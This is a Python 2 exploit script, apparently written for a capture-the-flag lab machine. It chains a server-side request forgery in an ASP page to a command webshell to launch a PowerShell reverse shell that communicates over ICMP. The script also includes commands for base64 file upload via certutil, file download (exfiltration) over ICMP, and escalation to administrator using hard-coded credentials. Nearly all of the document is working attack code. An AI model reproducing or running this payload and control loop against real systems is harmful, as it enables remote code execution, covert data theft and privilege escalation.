#!/usr/bin/env python2

# Author: Alamot
# -----------------------------------------------------------------------------
# Available commands:
# -----------------------------------------------------------------------------
# > UPLOAD local_path remote_path
#   (to upload a file using the HTTP protocol via xcmd, "echo >>" commands and
#    base64 encoding/decoding)
#   e.g. > UPLOAD myfile.txt C:\temp\myfile.txt
#
# > DOWNLOAD remote_path
#   (to download a file using the ICMP protocol and base64 encoding/decoding)
#    e.g. > DOWNLOAD C:\temp\myfile.txt
#
# > DECODER (to get user decoder)
#
# > ADMIN (to get user admin)
# -----------------------------------------------------------------------------

from __future__ import print_function
import shlex, tqdm
import os, sys, time
import base64, binascii, hashlib, uuid
import select, socket, threading
import requests, urllib
try:
    from impacket import ImpactDecoder
    from impacket import ImpactPacket
except ImportError:
    print('You need to install Python Impacket library first')
    sys.exit(255)

LHOST="10.10.15.43"
RHOST="10.10.10.57"
RPORT=62696
BUFFER_SIZE=110
INITIAL_UID = uuid.uuid4().hex[0:8]
DECODER_UID = uuid.uuid4().hex[0:8]


class NoQuotedSession(requests.Session):
    def send(self, *a, **kw):
        a[0].url = a[0].url.replace(urllib.quote(","), ",").replace(urllib.quote("\""), "\"").replace(urllib.quote(";"), ";").replace(urllib.quote("}"), "}").replace(urllib.quote("{"), "{").replace(urllib.quote(">"), ">")
        return requests.Session.send(self, *a, **kw)


def payload(lhost, uid):
    return "$ip = '"+lhost+"'; $id = '"+uid+"'; $ic = New-Object System.Net.NetworkInformation.Ping; $po = New-Object System.Net.NetworkInformation.PingOptions; $po.DontFragment=$true; function s($b) { $ic.Send($ip,5000,([text.encoding]::ASCII).GetBytes($b),$po) }; function p { -join($id,'[P$] ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ') }; while ($true) { $r = s(p); if (!$r.Buffer) { continue; }; $rs = ([text.encoding]::ASCII).GetString($r.Buffer);  if ($rs.Substring(0,8) -ne $id) { exit }; try { $rt = (iex -Command $rs.Substring(8) | Out-String); } catch { $rt = ($_.Exception|out-string) }; $i=0; while ($i -lt $rt.length-110) { s(-join($id,$rt.Substring($i,110))); $i -= -110; }; s(-join($id,$rt.Substring($i))); }"


def send_payload(uid):
    client = None
    try:
        client = NoQuotedSession()
        client.keep_alive = True
        # Send payload
        print("Sending powershell ICMP payload [UID="+uid+"] and waiting for shell...")
        response = client.get("http://"+RHOST+":"+str(RPORT)+"/Test.asp?u=http://127.0.0.1:80/cmd.aspx?xcmd=powershell -c \""+payload(LHOST, uid)+"\"")
        #print(response.request.path_url)
        if response.status_code != 200 and response.status_code != 500:
            print(response.text)
            sys.exit(0)
    except requests.exceptions.RequestException as e:
        print(str(e))
    finally:
        if client:
            client.close()


def httpupload(UID, local_path, remote_path, powershell=False):
    with open(local_path, 'rb') as f:
        data = f.read()
        if powershell:
            data = data.encode('UTF-16LE')
            b64enc_data = base64.urlsafe_b64encode(data)
        else:
            b64enc_data = "".join(base64.encodestring(data).split())
    md5sum = hashlib.md5(data).hexdigest()
    print("Uploading "+local_path+" to "+remote_path)
    print("MD5 hash: "+md5sum)
    print("Data Length: "+str(len(b64enc_data))+" bytes")
    client = NoQuotedSession()
    client.keep_alive = False
    try:
        if powershell:
            cmd = "powershell -c \"echo $null > '"+remote_path+".b64'\""
        else:
            cmd = 'type nul > "' + remote_path + '.b64"'
        response = client.get("http://"+RHOST+":"+str(RPORT)+"/Test.asp?u=http://127.0.0.1:80/cmd.aspx?xcmd="+cmd)
        for i in tqdm.tqdm(range(0, len(b64enc_data), BUFFER_SIZE), unit_scale=BUFFER_SIZE, unit="bytes"):
            if powershell:
                cmd = "powershell -c \"echo '"+b64enc_data[i:i+BUFFER_SIZE]+"' >> '"+remote_path+".b64'\""
            else:
                cmd = 'echo '+b64enc_data[i:i+BUFFER_SIZE].replace('+', '%25%32%62').replace('/', '%25%32%66')+' >> "' + remote_path + '.b64"'
            response = client.get("http://"+RHOST+":"+str(RPORT)+"/Test.asp?u=http://127.0.0.1:80/cmd.aspx?xcmd="+cmd)
        if powershell:
            cmd = "powershell -c \"[System.Convert]::FromBase64String((Get-Content '"+remote_path+".b64').Replace('-', '%25%32%62').Replace('_', '%25%32%66')) | Set-Content -Encoding Byte '"+remote_path+"'\""
        else:
            cmd = 'certutil -f -decode "' + remote_path + '.b64" "' + remote_path + '"'
        response = client.get("http://"+RHOST+":"+str(RPORT)+"/Test.asp?u=http://127.0.0.1:80/cmd.aspx?xcmd="+cmd)
    except requests.exceptions.RequestException as e:
        print(str(e))
    finally:
        if client:
            client.close()


def clear_buffer(sock):
    try:
        while sock.recv(1024): pass
    except:
        pass
        
   
def main(src, dst, UID):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except socket.error as e:
        print('You need to run icmp_alamot.py with administrator privileges')
        return 1
  
    sock.setblocking(0)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    ip = ImpactPacket.IP()
    ip.set_ip_src(src)
    ip.set_ip_dst(dst)
    icmp = ImpactPacket.ICMP()
    icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)
    decoder = ImpactDecoder.IPDecoder()

    cmd = ""
    download_buffer=""
    DOWNLOAD_filename = ""
    RECEIVED = False
    
    while 1:
        if sock in select.select([ sock ], [], [])[0]:
            buff = sock.recv(65536)
            
            if 0 == len(buff):
                sock.close()
                return 0

            ippacket = decoder.decode(buff)
            icmppacket = ippacket.child()

            if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and 8 == icmppacket.get_icmp_type():
                ident = icmppacket.get_icmp_id()
                seq_id = icmppacket.get_icmp_seq()
                data = icmppacket.get_data_as_string()
                
                if len(data) > 0:
                    #print("DATA: "+data)
                    recv_uid = data[:8].strip()
                    if recv_uid == UID:
                        if data[8:12] == '[P$]':
                            if DOWNLOAD_filename and RECEIVED:
                                #print("DOWNLOAD BUFFER: "+download_buffer)
                                try:
                                    decoded = base64.b64decode(download_buffer)
                                except:
                                    decoded = ""
                                    pass
                                with open(DOWNLOAD_filename, "wb") as f:
                                    f.write(decoded)
                                    f.close()
                                with open(DOWNLOAD_filename, 'rb') as f:
                                    md5sum = hashlib.md5(f.read()).hexdigest()
                                print("MD5 hash of downloaded file "+DOWNLOAD_filename+": "+md5sum)
                                print("*** DOWNLOAD COMPLETED ***")
                                DOWNLOAD_filename = ""
                                download_buffer = ""
                            if RECEIVED:
                                cmd = raw_input(data[8:])
                                clear_buffer(sock)
                                RECEIVED = False
                            else:
                                RECEIVED = True
                        else:
                            RECEIVED = True
                            if DOWNLOAD_filename:
                                download_buffer += data[8:].replace('`n','\n')
                            else:
                                print(data[8:].replace('`n','\n'),end='')


                if cmd[0:4].lower() == 'exit':
                    print("Exiting...")
                    sock.close()
                    return 0

                if cmd[0:7] == 'SHOWUID':
                    print("UID: "+UID)
                    cmd = "echo OK"

                if cmd[0:5] == 'ADMIN':
                    cmd = "$user = '.\\administrator'; $passwd = '1234test'; $secpswd = ConvertTo-SecureString $passwd -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $user, $secpswd; invoke-command -computername localhost -credential $credential -scriptblock { "+ payload(LHOST, UID) + " }"

                if cmd[0:7] == 'DECODER':
                    with open("c.ps1", "wt") as f:
                        f.write(payload(LHOST, DECODER_UID))
                        f.close()
                    time.sleep(1)
                    httpupload(UID, "c.ps1", "c:\\sysadmscripts\\c.ps1")
                    sock.close()
                    time.sleep(1)
                    print("Waiting for decoder shell...")
                    main(LHOST, RHOST, DECODER_UID)
                    
                if cmd[0:8] == 'DOWNLOAD':
                    fullpath = cmd[9:].strip()
                    cmd = "[Convert]::ToBase64String([IO.File]::ReadAllBytes('"+fullpath+"'))"
                    DOWNLOAD_filename = fullpath.split('\\')[-1]
                    download_buffer = ""

                if cmd[0:6] == 'UPLOAD':
                    (upload, local_path, remote_path) = shlex.split(cmd.strip(), posix=False)
                    httpupload(UID, local_path, remote_path, powershell=False)
                    cmd = "get-filehash -algorithm md5 '"+remote_path+"' | fl; $(CertUtil -hashfile '"+remote_path+"' MD5)[1] -replace ' ',''"


                icmp.set_icmp_id(ident)
                icmp.set_icmp_seq(seq_id)
                if cmd and cmd[:8] != UID:
                    cmd = UID+cmd
                icmp.contains(ImpactPacket.Data(cmd))
                icmp.set_icmp_cksum(0)
                icmp.auto_checksum = 1
                ip.contains(icmp)
                sock.sendto(ip.get_packet(), (dst, 0))
                

# Set /proc/sys/net/ipv4/icmp_echo_ignore_all = 1
with open("/proc/sys/net/ipv4/icmp_echo_ignore_all", 'wt') as f:
    f.write("1")

try:
    th1 = threading.Thread(target=send_payload, args = (INITIAL_UID,))
    th1.daemon = True
    th1.start()
    sys.exit(main(LHOST, RHOST, INITIAL_UID))
except (KeyboardInterrupt, SystemExit):
    th1.join()
except Exception as e:
    print(str(e))
